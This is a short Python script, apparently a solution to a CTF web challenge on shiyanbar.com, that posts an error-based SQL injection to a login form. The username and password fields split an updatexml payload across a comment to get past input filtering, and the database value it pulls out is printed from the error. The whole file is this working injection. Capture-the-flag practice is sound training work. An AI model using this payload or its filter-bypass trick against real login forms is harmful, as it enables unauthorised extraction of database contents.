##http://www.shiyanbar.com/ctf/2011
##加了料的报错注入
import requests

sql = "select value from ffll44jj"

data = {"username": "' or updatexml/*",
        "password": "*/(1,concat(0x3a,(%s)),1) or '" % sql}

url = 'http://ctf5.shiyanbar.com/web/baocuo/index.php?'
c = requests.post(url, data=data).text
print(c)
